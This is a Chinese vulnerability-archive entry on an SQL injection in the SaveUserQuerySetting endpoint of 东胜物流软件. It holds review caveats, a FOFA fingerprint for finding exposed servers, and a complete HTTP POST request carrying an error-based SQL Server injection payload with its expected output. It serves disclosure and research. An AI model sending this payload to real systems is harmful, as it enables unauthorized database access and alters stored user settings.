---
source: "wy876 漏洞文库"
title: "东胜物流软件 SaveUserQuerySetting formname SQL注入"
product: "东胜物流软件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；SQL Server"
prerequisites: "请求无Cookie，鉴权未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/kmeubkhryrzmp90u"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6SaveUserQuerySetting%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "fid=\"Z4c2hPCi5IR/AnH5vZXNSQ==\""
fofa_unverified: "fid="
id: "vw-606c00b3775550dc8eb1d72f"
entity_id: "ve-606c00b3775550dc8eb1d72f"
schema_version: "1"
---

# 东胜物流软件 SaveUserQuerySetting formname SQL注入

## 条目说明

- 对象与具体问题：东胜物流软件；SaveUserQuerySetting formname SQL注入
- 版本、配置及部署条件：版本未知；SQL Server
- 认证与权限前提：请求无Cookie，鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 有预期MD5标记但无完整响应，不可把预期值当实际复现
- querydetail结尾%7D后多一个}疑转存错误，JSON及Content-Length需核
- Save/issavevalue可修改用户查询设置，需副作用说明；PS_SALE含姓名应泛化
- 缺修复/源码，区别197另一入口

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
东胜物流软件是一款致力于为客户提供IT支撑的 SOP， 帮助客户大幅提高工作效率，降低各个环节潜在风险的物流软件。东胜物流软件 SaveUserQuerySetting接口处存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## 二、影响版本
+ 东胜物流软件

## 三、资产测绘
+ fofa`fid="Z4c2hPCi5IR/AnH5vZXNSQ=="`
+ 特征


## 四、漏洞复现
```http
POST /MvcShipping/MsBaseInfo/SaveUserQuerySetting HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

formname=MsRptSaleBalProfitShareIndex'+AND+2523+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT+SUBSTRING((ISNULL(CAST((+sys.fn_VarBinToHexStr(hashbytes('MD5','hello')))+AS+NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))+AND+'uKco'%3d'uKco&isvisible=true&issavevalue=true&querydetail=%7B%22PS_MBLNO%22%3A%22%22%2C%22PS_VESSEL%22%3A%22%22%2C%22PS_VOYNO%22%3A%22%22%2C%22PS_SALE%22%3A%22%5Cu91d1%5Cu78ca%22%2C%22PS_OP%22%3Anull%2C%22PS_EXPDATEBGN%22%3A%222020-02-01%22%2C%22PS_EXPDATEEND%22%3A%222020-02-29%22%2C%22PS_STLDATEBGN%22%3A%22%22%2C%22PS_STLDATEEND%22%3A%22%22%2C%22PS_ACCDATEBGN%22%3A%22%22%2C%22PS_ACCDATEEND%22%3A%22%22%2C%22checkboxfield-1188-inputEl%22%3A%22on%22%2C%22PS_CUSTSERVICE%22%3Anull%2C%22PS_DOC%22%3Anull%2C%22hiddenfield-1206-inputEl%22%3A%22%22%7D}
```

> 请求长度说明：原资料 Content-Length 为 857；静态长度已移除，应由客户端根据最终请求体的字节数生成。


```plain
qxpqq0x5d41402abc4b2a76b9719d911017c592qzkqq
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kmeubkhryrzmp90u>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
